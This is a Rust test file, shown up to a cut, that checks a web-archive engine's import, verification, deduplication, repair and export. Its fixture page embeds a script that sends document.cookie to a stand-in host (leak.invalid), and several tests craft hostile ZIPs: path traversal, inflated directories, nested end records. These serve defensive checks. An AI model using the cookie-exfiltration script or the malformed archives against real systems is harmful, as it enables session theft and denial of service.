//! Risk basis: untrusted imports must not publish corrupt archives; derivatives
//! must not lose payloads, overwrite originals, or execute captured credentials.
use super::*;
use std::io::Write;
use zip::{write::SimpleFileOptions, CompressionMethod, ZipWriter};

fn write_zip(path: &Path, entries: Vec<(&str, Vec<u8>)>) {
    let mut zip = ZipWriter::new(std::fs::File::create(path).unwrap());
    for (name, data) in entries {
        zip.start_file(
            name,
            SimpleFileOptions::default().compression_method(CompressionMethod::Stored),
        )
        .unwrap();
        zip.write_all(&data).unwrap();
    }
    zip.finish().unwrap();
}
pub(super) fn fixture(path: &Path) {
    let payload=b"<!doctype html><html><head><title>Archive fixture</title></head><body><h1>Saved content</h1><div class=ad>Remove me</div><script>fetch('https://leak.invalid/cookie?'+document.cookie)</script><img src='/shared.png'><p>Readable words.</p></body></html>";
    let block=[format!("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n",payload.len()).as_bytes(),payload].concat();
    let raw=[format!("WARC/1.1\r\nWARC-Type: response\r\nWARC-Target-URI: https://example.test/\r\nWARC-Date: 2026-01-02T03:04:05Z\r\nWARC-Record-ID: <urn:uuid:fixture>\r\nContent-Type: application/http; msgtype=response\r\nContent-Length: {}\r\n\r\n",block.len()).as_bytes(),&block,b"\r\n\r\n"].concat();
    let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
    encoder.write_all(&raw).unwrap();
    let warc = encoder.finish().unwrap();
    let index=format!("test,example)/ 20260102030405 {}\n",serde_json::json!({"url":"https://example.test/","filename":"capture.warc.gz","offset":0,"length":warc.len(),"status":"200","mime":"text/html"})).into_bytes();
    let pages=b"{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}\n{\"url\":\"https://example.test/\",\"title\":\"Archive fixture\",\"ts\":\"2026-01-02T03:04:05Z\"}\n".to_vec();
    let entries = vec![
        ("archive/capture.warc.gz", warc),
        ("indexes/index.cdxj", index),
        ("pages/pages.jsonl", pages),
    ];
    let resources:Vec<_>=entries.iter().map(|(name,bytes)|serde_json::json!({"path":name,"name":name,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    let manifest=serde_json::to_vec(&serde_json::json!({"profile":"data-package","wacz_version":"1.1.1","title":"Fixture","resources":resources})).unwrap();
    let mut entries = entries;
    entries.push(("datapackage.json", manifest));
    write_zip(path, entries);
}
#[test]
fn archive_engine_import_fixity_and_actual_inventory() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let report = inspect_archive(&path).unwrap();
    assert_eq!(report.resources.len(), 1);
    assert_eq!(report.pages.len(), 1);
    assert!(report.pages[0].text.contains("Saved content"));
    assert!(!report.pages[0].text.contains("document.cookie"));
    assert_eq!(
        report.archive_bytes,
        report.unique_payload_bytes + report.duplicate_payload_bytes + report.metadata_bytes
    );
    let verification = verify_archive(&path).unwrap();
    assert!(verification.valid);
    assert!(verification
        .checks
        .iter()
        .any(|c| c.name == "offline-browser-replay" && c.status == "not-run"));
}
#[test]
fn archive_engine_rejects_unsafe_member_and_corrupt_manifest() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("unsafe.wacz");
    write_zip(&path, vec![("../escape", vec![0])]);
    assert!(inspect_archive(&path).is_err());
    write_zip(
        &path,
        vec![
            ("archive/a.warc.gz", vec![1]),
            (
                "datapackage.json",
                br#"{"resources":[{"path":"archive/a.warc.gz","bytes":1,"hash":"sha256:wrong"}]}"#
                    .to_vec(),
            ),
        ],
    );
    assert!(inspect_archive(&path).unwrap_err().contains("SHA-256"));
}
#[test]
fn archive_engine_bounded_inflation() {
    assert!(read::bounded(&b"12345"[..], 4).is_err());
}

#[test]
fn archive_engine_raw_zip_preflight_before_deduplicating_allocation() {
    // WA-ENG-001: a tiny declared/deduplicated inventory must not hide an
    // attacker-controlled raw directory or trigger unbounded zip allocations.
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("raw-directory.wacz");
    fixture(&path);
    let original = std::fs::read(&path).unwrap();
    let end_at = original.len() - 22;
    let start = u32::from_le_bytes(original[end_at + 16..end_at + 20].try_into().unwrap()) as usize;
    let entry_len = 46
        + [28, 30, 32]
            .iter()
            .map(|p| {
                u16::from_le_bytes(original[start + p..start + p + 2].try_into().unwrap()) as usize
            })
            .sum::<usize>();
    for (raw_count, declared, expected) in [
        (10_005, 10_005, "count exceeds"),
        (2, 2, "Duplicate ZIP"),
        (10_005, 1, "raw member count"),
    ] {
        let mut raw = original[..start].to_vec();
        for _ in 0..raw_count {
            raw.extend_from_slice(&original[start..start + entry_len]);
        }
        let mut end = original[end_at..].to_vec();
        end[8..10].copy_from_slice(&(declared as u16).to_le_bytes());
        end[10..12].copy_from_slice(&(declared as u16).to_le_bytes());
        end[12..16].copy_from_slice(&((raw_count * entry_len) as u32).to_le_bytes());
        raw.extend_from_slice(&end);
        std::fs::write(&path, raw).unwrap();
        assert_eq!(
            zip::ZipArchive::new(std::fs::File::open(&path).unwrap())
                .unwrap()
                .len(),
            1,
            "zip collapses the raw duplicate filenames"
        );
        assert!(inspect_archive(&path).unwrap_err().contains(expected));
    }
    let mut oversized = original.clone();
    oversized[end_at + 12..end_at + 16].copy_from_slice(&(32u32 * 1024 * 1024 + 1).to_le_bytes());
    std::fs::write(&path, oversized).unwrap();
    assert!(inspect_archive(&path)
        .unwrap_err()
        .contains("directory exceeds"));

    // Duplicate EOCD signatures in a directory/comment would let zip's
    // permissive fallback choose a different, unqualified metadata inventory.
    let mut nested = original.clone();
    nested[end_at + 20..end_at + 22].copy_from_slice(&22u16.to_le_bytes());
    nested.extend_from_slice(&original[end_at..]);
    // The outer record ends at EOF; the inner record has an impossible length.
    let inner = nested.len() - 22;
    nested[inner + 20..inner + 22].copy_from_slice(&u16::MAX.to_le_bytes());
    std::fs::write(&path, nested).unwrap();
    assert!(inspect_archive(&path).unwrap_err().contains("nested ZIP"));

    // Exercise true ZIP64 end records without regenerating a multi-GiB body.
    let mut z = vec![0u8; 56];
    z[..4].copy_from_slice(b"PK\x06\x06");
    z[4..12].copy_from_slice(&44u64.to_le_bytes());
    z[12..14].copy_from_slice(&45u16.to_le_bytes());
    z[14..16].copy_from_slice(&45u16.to_le_bytes());
    z[24..32].copy_from_slice(&4u64.to_le_bytes());
    z[32..40].copy_from_slice(&4u64.to_le_bytes());
    z[40..48].copy_from_slice(&((end_at - start) as u64).to_le_bytes());
    z[48..56].copy_from_slice(&(start as u64).to_le_bytes());
    let mut locator = vec![0u8; 20];
    locator[..4].copy_from_slice(b"PK\x06\x07");
    locator[8..16].copy_from_slice(&(end_at as u64).to_le_bytes());
    locator[16..20].copy_from_slice(&1u32.to_le_bytes());
    let mut end = original[end_at..].to_vec();
    end[8..20].fill(0xff);
    for (valid, count) in [(true, 4u64), (false, u64::MAX)] {
        z[24..32].copy_from_slice(&count.to_le_bytes());
        z[32..40].copy_from_slice(&count.to_le_bytes());
        let raw = [&original[..end_at], &z, &locator, &end].concat();
        std::fs::write(&path, raw).unwrap();
        if valid {
            assert!(verify_archive(&path).unwrap().valid);
        } else {
            assert!(inspect_archive(&path)
                .unwrap_err()
                .contains("count exceeds"));
        }
    }
}

fn rewrite_package(path: &Path, edit: impl FnOnce(&mut BTreeMap<String, Vec<u8>>)) {
    let mut zip = zip::ZipArchive::new(std::fs::File::open(path).unwrap()).unwrap();
    let mut entries = BTreeMap::new();
    for i in 0..zip.len() {
        let mut member = zip.by_index(i).unwrap();
        if matches!(
            member.name(),
            "datapackage.json" | "datapackage-digest.json"
        ) {
            continue;
        }
        let name = member.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut member, &mut bytes).unwrap();
        entries.insert(name, bytes);
    }
    drop(zip);
    edit(&mut entries);
    let resources: Vec<_> = entries
        .iter()
        .map(|(name, data)| {
            serde_json::json!({
                "path":name,"bytes":data.len(),"hash":format!("sha256:{}",read::hash(data))
            })
        })
        .collect();
    entries.insert(
        "datapackage.json".into(),
        serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
    );
    write_zip(
        path,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
}

fn rewrite_manifest(path: &Path, edit: impl FnOnce(&mut serde_json::Value)) {
    let mut zip = zip::ZipArchive::new(std::fs::File::open(path).unwrap()).unwrap();
    let mut entries = BTreeMap::new();
    for i in 0..zip.len() {
        let mut member = zip.by_index(i).unwrap();
        let name = member.name().to_owned();
        let mut data = vec![];
        std::io::Read::read_to_end(&mut member, &mut data).unwrap();
        entries.insert(name, data);
    }
    drop(zip);
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&entries["datapackage.json"]).unwrap();
    edit(&mut manifest);
    let manifest = serde_json::to_vec(&manifest).unwrap();
    let digest = serde_json::json!({"path":"datapackage.json","hash":format!("sha256:{}",read::hash(&manifest))});
    entries.insert("datapackage.json".into(), manifest);
    entries.insert(
        "datapackage-digest.json".into(),
        serde_json::to_vec(&digest).unwrap(),
    );
    write_zip(
        path,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
}

#[test]
fn archive_engine_standard_dependency_relations_require_authorized_hash_bindings() {
    // WA-INT001: standard viewers cannot find a parent's payload without
    // relation.requires, and archive-supplied labels must not grant access.
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let source = dir.path().join("source.wacz");
    let dependent = dir.path().join("dependent.wacz");
    let payload = noise(32 * 1024);
    let entries = [(
        "https://example.test/asset",
        "image/png",
        payload.as_slice(),
    )];
    multi_fixture(&parent, &entries, "2026-01-01T00:00:00Z");
    multi_fixture(&source, &entries, "2026-02-01T00:00:00Z");
    let parent_hash = inspect_archive(&parent).unwrap().sha256;
    let dependencies = [AuthorizedDependency {
        archive_id: "parent".into(),
        sha256: parent_hash.clone(),
        authorized_local_path: parent.clone(),
    }];
    deduplicate_archive(&source, &dependent, &dependencies).unwrap();
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&dependent).unwrap()).unwrap();
    let manifest: serde_json::Value =
        serde_json::from_reader(zip.by_name("datapackage.json").unwrap()).unwrap();
    assert_eq!(
        manifest["relation"]["requires"],
        serde_json::json!([{"filename":"parent.wacz","hash":format!("sha256:{parent_hash}")}])
    );
    drop(zip);
    assert!(!verify_archive(&dependent).unwrap().valid);
    assert!(materialize_archive(
        &dependent,
        &dir.path().join("denied.wacz"),
        &[],
        &ExportOptions::default()
    )
    .is_err());
    let output = dir.path().join("standalone.wacz");
    materialize_archive(
        &dependent,
        &output,
        &dependencies,
        &ExportOptions::default(),
    )
    .unwrap();
    assert!(verify_archive(&output).unwrap().valid);
    assert!(inspect_archive(&output).unwrap().dependencies.is_empty());
    for case in 0..7 {
        let bad = dir.path().join(format!("unbound-{case}.wacz"));
        std::fs::copy(&dependent, &bad).unwrap();
        rewrite_manifest(&bad, |manifest| match case {
            0 => {
                manifest["relation"]["requires"][0]["hash"] =
                    serde_json::json!(format!("sha256:{}", "0".repeat(64)));
            }
            1 => {
                manifest["relation"]["requires"][0]["filename"] =
                    serde_json::json!("https://live.invalid/parent.wacz");
            }
            2 => {
                manifest["relation"]["requires"][0]["filename"] =
                    serde_json::json!("another-owner.wacz");
            }
            3 => {
                let duplicate = manifest["relation"]["requires"][0].clone();
                manifest["relation"]["requires"]
                    .as_array_mut()
                    .unwrap()
                    .push(duplicate);
            }
            4 => {
                manifest
                    .as_object_mut()
                    .unwrap()
                    .remove("webArchivesDependencies");
                manifest
                    .as_object_mut()
                    .unwrap()
                    .remove("webArchivesDependencyHashes");
            }
            5 => {
                manifest["relation"]["requires"] = serde_json::json!([]);
            }
            _ => {
                manifest["relation"]["requires"][0]
                    .as_object_mut()
                    .unwrap()
                    .remove("hash");
            }
        });
        assert!(
            inspect_archive(&bad).is_err(),
            "unbound relation case {case}"
        );
        assert!(materialize_archive(
            &bad,
            &dir.path().join(format!("bad-output-{case}.wacz")),
            &dependencies,
            &ExportOptions::default()
        )
        .is_err());
    }
    // Previously generated engine archives retain their authorized recovery
    // path, with a clear standard-replay warning rather than an automatic fetch.
    rewrite_manifest(&dependent, |manifest| {
        manifest.as_object_mut().unwrap().remove("relation");
    });
    let report = inspect_archive(&dependent).unwrap();
    assert_eq!(report.dependencies, vec!["parent"]);
    assert!(report
        .warnings
        .iter()
        .any(|w| w.contains("relation.requires")));
    materialize_archive(
        &dependent,
        &dir.path().join("legacy-recovered.wacz"),
        &dependencies,
        &ExportOptions::default(),
    )
    .unwrap();
}

#[test]
fn archive_engine_reader_cap_prevents_escaped_response_and_dependency_amplification() {
    // Concrete integration P1: escaped native page text could allocate multiple
    // response-sized temporaries, then survive as several slow HTTP bodies.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("reader.wacz");
    fixture(&source);
    rewrite_package(&source, |entries| {
        let text = "&<>'\"é[]!_*#`|\\".repeat(16 * 1024);
        entries.insert("pages/pages.jsonl".into(), format!("{{\"format\":\"json-pages-1.0\"}}\n{}\n", serde_json::json!({
            "url":"https://example.test/","title":"Native &<>'\"é[]!_*#`|\\","ts":"2026-01-02T03:04:05Z","text":text
        })).into_bytes());
    });
    let before = inspect_archive(&source).unwrap().sha256;
    for format in ["html", "markdown"] {
        let expected = reader_export(&source, format).unwrap();
        assert!(expected.len() > 512 * 1024);
        let error = reader_export_authorized_limited(&source, format, &[], 512 * 1024).unwrap_err();
        assert_eq!(error, "Reader output exceeds bounded size");
        assert_eq!(
            reader_export_authorized_limited(&source, format, &[], expected.len()).unwrap(),
            expected
        );
        assert_eq!(
            reader_export_authorized_limited(&source, format, &[], expected.len() - 1).unwrap_err(),
            "Reader output exceeds bounded size"
        );
    }
    assert!(reader_export_authorized_limited(&source, "html", &[], 0).is_err());
    let parent = dir.path().join("parent.wacz");
    std::fs::copy(&source, &parent).unwrap();
    let inputs = [AuthorizedDependency {
        archive_id: "parent".into(),
        sha256: before.clone(),
        authorized_local_path: parent,
    }];
    let dependent = dir.path().join("dependent.wacz");
    deduplicate_archive(&source, &dependent, &inputs).unwrap();
    // Individually these inventories fit; their aggregate is rejected before
    // hydration/report cloning rather than admitting the legacy 256 MiB pool.
    let budget = read::load(&source)
        .unwrap()
        .cost
        .max(read::load(&dependent).unwrap().cost)
        + 1024;
    assert!(read::load(&dependent).unwrap().cost < budget);
    let error = reader_export_authorized_limited(&dependent, "html", &inputs, budget).unwrap_err();
    assert!(
        error.contains("Combined archive dependency metadata"),
        "{error}"
    );
    assert_eq!(inspect_archive(&source).unwrap().sha256, before);
}

#[test]
fn archive_engine_reader_budget_counts_expanded_cdx_and_analysis_together() {
    // WA-ENG-005: a valid tiny compressed index retained 8 MiB of unknown CDX
    // metadata while the caller's 1 MiB inventory budget incorrectly passed.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("expanded-index.wacz");
    fixture(&source);
    let padding = "x".repeat(8 * 1024 * 1024);
    let metadata_key = "extra-key".repeat(4096);
    rewrite_package(&source, |entries| {
        let raw = entries.remove("indexes/index.cdxj").unwrap();
        let line = std::str::from_utf8(&raw).unwrap().trim_end();
        let start = line.find('{').unwrap();
        let mut row: serde_json::Value = serde_json::from_str(&line[start..]).unwrap();
        // Unknown/nested metadata must be preserved, never dropped to fit.
        row["custom"] = serde_json::json!({"nested":[{(metadata_key.clone()):padding}]});
        let expanded = format!("{}{}\n", &line[..start], row);
        let mut enc = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
        enc.write_all(expanded.as_bytes()).unwrap();
        let compressed = enc.finish().unwrap();
        entries.insert(
            "indexes/index.idx".into(),
            format!(
                "{}{}\n",
                &line[..start],
                serde_json::json!({"filename":"index.cdx.gz","offset":0,"length":compressed.len()})
            )
            .into_bytes(),
        );
        entries.insert("indexes/index.cdx.gz".into(), compressed);
    });
    assert!(std::fs::metadata(&source).unwrap().len() < 16 * 1024);
    let before = inspect_archive(&source).unwrap().sha256;
    let error = reader_export_authorized_limited(&source, "html", &[], 1024 * 1024).unwrap_err();
    assert!(error.contains("Archive metadata exceeds"), "{error}");
    let loaded = read::load(&source).unwrap();
    assert!(loaded.cost >= padding.len() + metadata_key.len());
    assert_eq!(
        loaded.records[0].index["custom"]["nested"][0][&metadata_key],
        padding
    );
    let cost = loaded.cost;
    drop(loaded);
    // Metadata fits exactly, but optional extracted text must share that pool.
    let error = reader_export_authorized_limited(&source, "html", &[], cost).unwrap_err();
    assert!(error.contains("Reader analysis exceeds"), "{error}");
    assert!(reader_export_authorized_limited(&source, "html", &[], cost + 1024).is_ok());

    let small = dir.path().join("small.wacz");
    fixture(&small);
    let inputs = [AuthorizedDependency {
        archive_id: "expanded".into(),
        sha256: before.clone(),
        authorized_local_path: source.clone(),
    }];
    let dependent = dir.path().join("dependent.wacz");
    deduplicate_archive(&small, &dependent, &inputs).unwrap();
    let error =
        reader_export_authorized_limited(&dependent, "html", &inputs, 1024 * 1024).unwrap_err();
    assert!(
        error.contains("Combined archive dependency metadata"),
        "{error}"
    );
    let combined = cost + read::load(&dependent).unwrap().cost;
    let error =
        reader_export_authorized_limited(&dependent, "html", &inputs, combined).unwrap_err();
    assert!(error.contains("Reader analysis exceeds"), "{error}");
    assert!(reader_export_authorized_limited(&dependent, "html", &inputs, combined + 1024).is_ok());
    // A larger budget preserves the complete arbitrary metadata in derivatives.
    let output = dir.path().join("preserved-index.wacz");
    export_archive(&source, &output, &ExportOptions::default()).unwrap();
    assert_eq!(
        read::load(&output).unwrap().records[0].index["custom"]["nested"][0][&metadata_key],
        padding
    );
    assert_eq!(inspect_archive(&source).unwrap().sha256, before);
}

#[test]
fn archive_engine_cdx_identity_and_sorted_range_regression() {
    // WA-ENG-002: recomputed manifests do not make arbitrary lookup keys
    // replayable. Validate plain and block-compressed indexes, not just hashes.
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("index.wacz");
    for compressed in [false, true] {
        for key in ["invalid", "wrong)/unrelated"] {
            fixture(&path);
            rewrite_package(&path, |entries| {
                let raw = entries.remove("indexes/index.cdxj").unwrap();
                let line = String::from_utf8(raw).unwrap();
                let changed = format!("{key} {}", line.split_once(' ').unwrap().1).into_bytes();
                if compressed {
                    let mut enc =
                        flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
                    enc.write_all(&changed).unwrap();
                    let data = enc.finish().unwrap();
                    entries.insert("indexes/index.idx".into(), format!("{key} 20260102030405 {}\n",serde_json::json!({"filename":"index.cdx.gz","offset":0,"length":data.len()})).into_bytes());
                    entries.insert("indexes/index.cdx.gz".into(), data);
                } else {
                    entries.insert("indexes/index.cdxj".into(), changed);
                }
            });
            assert!(!verify_archive(&path).unwrap().valid);
            assert!(inspect_archive(&path)
                .unwrap_err()
                .contains("lookup key differs"));
            assert!(export_archive(
                &path,
                &dir.path().join("invalid-export.wacz"),
                &ExportOptions::default()
            )
            .is_err());
        }
    }
    // Literal expectations obtained directly from the installed pinned
    // warcio 2.4.11 getSurt/postToGetUrl (not from this implementation).
    let url = "https://www2.Example.test:443/Path?B=2&A=1#Section";
    multi_fixture(
        &path,
        &[
            (url, "text/html", b"<h1>Native key</h1>"),
            (
                "urn:screenshot:https://example.test/#Page",
                "image/png",
                b"PNG",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    rewrite_package(&path, |entries| {
        let raw = String::from_utf8(entries["indexes/index.cdxj"].clone()).unwrap();
        assert!(raw.starts_with("test,example)/path?a=1&b=2 "));
        assert!(raw.contains("urn:screenshot:https://example.test/#Page "));
        // Reversing otherwise valid rows must fail native block range lookup.
        let mut rows: Vec<_> = raw.lines().collect();
        rows.reverse();
        entries.insert(
            "indexes/index.cdxj".into(),
            format!("{}\n", rows.join("\n")).into_bytes(),
        );
    });
    assert!(inspect_archive(&path).unwrap_err().contains("not sorted"));

    for (body, key) in [
        (
            "Z=%C3%A9&a=hello%20world&b=%2F&&v=one+two",
            "test,example)/api?&__wb_method=post&a=1&a=hello%20world&b=%2f&b=2&v=one+two&z=%C3%A9",
        ),
        ("bad=%FF", "test,example)/api?&__wb_method=post&a=1&b=2"),
    ] {
        let url = "https://example.test/api?B=2&A=1";
        multi_fixture(
            &path,
            &[(url, "text/html", b"<h1>POST response</h1>")],
            "2026-01-01T00:00:00Z",
        );
        rewrite_package(&path, |entries| {
            let raw = String::from_utf8(entries["indexes/index.cdxj"].clone()).unwrap();
            let mut row: serde_json::Value =
                serde_json::from_str(&raw[raw.find('{').unwrap()..]).unwrap();
            row["method"] = serde_json::json!("POST");
            row["requestBody"] = serde_json::json!(body);
            entries.insert(
                "indexes/index.cdxj".into(),
                format!("{key} 20260101000000 {row}\n").into_bytes(),
            );
        });
        assert!(verify_archive(&path).unwrap().valid);
        let output = dir.path().join(format!("post-{}.wacz", body.len()));
        assert!(export_archive(&path, &output, &ExportOptions::default()).is_ok());
        assert_eq!(read::load(&output).unwrap().records[0].index_key, key);
    }
    for (url, key) in [
        (
            "https://www.Example.test/Ä?B=%C3%A9&A=%2F",
            "test,example)/%C3%A4?a=%2f&b=%c3%a9",
        ),
        ("https://WWW.Example.test/Path?", "test,example,www)/path"),
        ("http:example.test/Path", "test,example)/path"),
    ] {
        multi_fixture(
            &path,
            &[(url, "text/html", b"<h1>SURT variants</h1>")],
            "2026-01-01T00:00:00Z",
        );
        rewrite_package(&path, |entries| {
            let line = String::from_utf8(entries["indexes/index.cdxj"].clone()).unwrap();
            entries.insert(
                "indexes/index.cdxj".into(),
                format!("{key} {}", line.split_once(' ').unwrap().1).into_bytes(),
            );
        });
        assert!(verify_archive(&path).unwrap().valid, "{url}");
    }
}

#[test]
fn archive_engine_repair_success_cannot_be_shadowed_by_later_failure() {
    // WA-ENG-003: a later failed retry must never discard a working original
    // and then become the repaired replay/reader response for that URL.
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let patch = dir.path().join("patch.wacz");
    let output = dir.path().join("repaired.wacz");
    multi_fixture(
        &parent,
        &[
            (
                "https://example.test/target",
                "text/html",
                b"<h1>Old target</h1>",
            ),
            (
                "https://example.test/untouched",
                "text/html",
                b"<h1>Untouched</h1>",
            ),
            (
                "https://example.test/failed",
                "text/html",
                b"<h1>Keep parent</h1>",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    capture_fixture(
        &patch,
        &[
            (
                "https://example.test/target",
                "text/html",
                b"<h1>Successful repair</h1>",
                "2026-02-01T00:00:00Z",
                200,
                false,
            ),
            (
                "https://example.test/target",
                "text/html",
                b"<h1>Later failure</h1>",
                "2026-02-02T00:00:00Z",
                500,
                true,
            ),
            (
                "https://example.test/failed",
                "text/html",
                b"<h1>Failed patch</h1>",
                "2026-02-02T00:00:00Z",
                500,
                true,
            ),
            (
                "https://example.test/patch.css",
                "text/css",
                b"body{color:green}",
                "2026-02-01T00:00:00Z",
                200,
                false,
            ),
        ],
    );
    // Round 2: only the failed retry has a native row. Nearest-row matching
    // retained its title/text/date even after the failed response was excluded.
    rewrite_package(&patch, |entries| {
        let data = std::str::from_utf8(&entries["pages/pages.jsonl"]).unwrap();
        let rows: Vec<_> = data
            .lines()
            .map(|line| {
                let mut row: serde_json::Value = serde_json::from_str(line).unwrap();
                if row["url"] == "https://example.test/target" {
                    row["title"] = serde_json::json!("FAILED native title");
                    row["text"] = serde_json::json!("FAILED native baseline");
                }
                row.to_string()
            })
            .collect();
        entries.insert(
            "pages/pages.jsonl".into(),
            format!("{}\n", rows.join("\n")).into_bytes(),
        );
    });
    let before = inspect_archive(&parent).unwrap().sha256;
    let patch_before = inspect_archive(&patch).unwrap().sha256;
    let report = compose_repair(
        &parent,
        &patch,
        &output,
        &[],
        &[
            "https://example.test/target".into(),
            "https://example.test/failed".into(),
        ],
    )
    .unwrap();
    assert!(verify_archive(&output).unwrap().valid);
    let repaired = read::load(&output).unwrap();
    let targets: Vec<_> = repaired
        .records
        .iter()
        .filter(|r| r.url().ends_with("/target"))
        .collect();
    assert_eq!(targets.len(), 1);
    assert_eq!(targets[0].status, 200);
    assert_eq!(targets[0].field("warc-date"), "2026-02-01T00:00:00Z");
    let html = preview_page(&output, "https://example.test/target").unwrap();
    assert!(html.contains("Successful repair"));
    let reader = reader_export(&output, "html").unwrap();
    assert!(!reader.contains("Later failure") && !reader.contains("Failed patch"));
    assert!(!reader.contains("FAILED"));
    assert!(reader.contains("Successful repair"));
    assert!(reader.contains("Untouched") && reader.contains("Keep parent"));
    assert!(report
        .resources
        .iter()
        .any(|r| r.url.ends_with("patch.css")));
    assert!(report.pages.iter().all(|p| !p.ts.starts_with("2026-02-02")));
    let page = report
        .pages
        .iter()
        .find(|p| p.url.ends_with("/target"))
        .unwrap();
    assert_eq!(page.ts, "2026-02-01T00:00:00Z");
    assert_eq!(page.status, 200);
    assert!(report
        .warnings
        .iter()
        .any(|w| w.contains("native page metadata") && w.contains("rebuilt")));
    assert_eq!(inspect_archive(&parent).unwrap().sha256, before);
    assert_eq!(inspect_archive(&patch).unwrap().sha256, patch_before);
}

#[test]
fn archive_engine_selected_pages_keep_embedded_and_dynamic_html() {
    // WA-ENG-004: HTML MIME is not page inventory; a page-listed iframe can
    // also be a required resource. Losing either breaks the standalone archive.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("frames.wacz");
    for (listed, dynamic) in [(false, false), (true, false), (true, true)] {
        let html: &[u8] = if dynamic {
            b"<h1>Selected</h1><script>fetch('/frame')</script>"
        } else {
            b"<h1>Selected</h1><iframe src='/frame'></iframe>"
        };
        capture_fixture(
            &source,
            &[
                (
                    "https://example.test/selected",
                    "text/html",
                    html,
                    "2026-01-01T00:00:00Z",
                    200,
                    true,
                ),
                (
                    "https://example.test/frame",
                    "text/html",
                    b"<frameset><frame src='/nested'></frameset>",
                    "2026-01-01T00:00:00Z",
                    200,
                    listed,
                ),
                (
                    "https://example.test/nested",
                    "text/html",
                    b"<p>Nested</p>",
                    "2026-01-01T00:00:00Z",
                    200,
                    listed,
                ),
                (
                    "https://example.test/other",
                    "text/html",
                    b"<h1>Other page</h1>",
                    "2026-01-01T00:00:00Z",
                    200,
                    true,
                ),
                (
                    "https://example.test/dynamic.json",
                    "application/json",
                    b"{}",
                    "2026-01-01T00:00:00Z",
                    200,
                    false,
                ),
            ],
        );
        let before = inspect_archive(&source).unwrap().sha256;
        let output = dir.path().join(format!("selected-{listed}-{dynamic}.wacz"));
        let options = ExportOptions {
            include_urls: vec!["https://example.test/selected#section".into()],
            ..Default::default()
        };
        let report = export_archive(&source, &output, &options).unwrap();
        assert!(verify_archive(&output).unwrap().valid);
        for suffix in ["/selected", "/frame", "/nested", "/dynamic.json"] {
            assert!(
                report.resources.iter().any(|r| r.url.ends_with(suffix)),
                "missing {suffix}"
            );
        }
        assert_eq!(
            report.resources.iter().any(|r| r.url.ends_with("/other")),
            dynamic
        );
        if listed {
            assert!(report.pages.iter().any(|p| p.url.ends_with("/frame")));
        }
        let excluded = dir.path().join(format!("explicit-{listed}-{dynamic}.wacz"));
        let mut options = options;
        options
            .exclude_urls
            .push("https://example.test/frame".into());
        let report = export_archive(&source, &excluded, &options).unwrap();
        assert!(!report.resources.iter().any(|r| r.url.ends_with("/frame")));
        assert_eq!(inspect_archive(&source).unwrap().sha256, before);
    }
}

fn noise(size: usize) -> Vec<u8> {
    let mut seed = 0x1020304050607080u64;
    (0..size)
        .map(|_| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            seed as u8
        })
        .collect()
}
fn multi_fixture(path: &Path, entries: &[(&str, &str, &[u8])], date: &str) {
    let captures: Vec<_> = entries
        .iter()
        .map(|(url, mime, payload)| (*url, *mime, *payload, date, 200, *mime == "text/html"))
        .collect();
    capture_fixture(path, &captures);
}
fn capture_fixture(path: &Path, entries: &[(&str, &str, &[u8], &str, u16, bool)]) {
    let mut warc = vec![];
    let mut index = String::new();
    let mut pages = String::from("{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}\n");
    for (i, (url, mime, payload, date, status, is_page)) in entries.iter().enumerate() {
        let block=[format!("HTTP/1.1 {status} Fixture\r\nContent-Type: {mime}; charset=utf-8\r\nContent-Length: {}\r\n\r\n",payload.len()).as_bytes(),payload].concat();
        let raw=[format!("WARC/1.1\r\nWARC-Type: response\r\nWARC-Target-URI: {url}\r\nWARC-Date: {date}\r\nWARC-Record-ID: <urn:uuid:{}-{i}>\r\nContent-Type: application/http; msgtype=response\r\nContent-Length: {}\r\n\r\n",read::hash(date.as_bytes()),block.len()).as_bytes(),&block,b"\r\n\r\n"].concat();
        let offset = warc.len();
        let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
        encoder.write_all(&raw).unwrap();
        let bytes = encoder.finish().unwrap();
        warc.extend_from_slice(&bytes);
        index.push_str(&format!("{} {} {}\n",super::index_key::surt(url),read::timestamp_of(date).unwrap(),serde_json::json!({"url":url,"filename":"capture.warc.gz","offset":offset.to_string(),"length":bytes.len().to_string(),"status":status.to_string(),"mime":mime})));
        if *is_page {
            pages.push_str(&format!(
                "{}\n",
                serde_json::json!({"url":url,"ts":date,"title":"Fixture"})
            ));
        }
    }
    let mut rows: Vec<_> = index.lines().collect();
    rows.sort_unstable();
    let index = format!("{}\n", rows.join("\n"));
    let entries = vec![
        ("archive/capture.warc.gz", warc),
        ("indexes/index.cdxj", index.into_bytes()),
        ("pages/pages.jsonl", pages.into_bytes()),
    ];
    let resources:Vec<_>=entries.iter().map(|(name,bytes)|serde_json::json!({"path":name,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    let manifest = serde_json::to_vec(
        &serde_json::json!({"wacz_version":"1.1.1","title":"Fixture","resources":resources}),
    )
    .unwrap();
    let mut entries = entries;
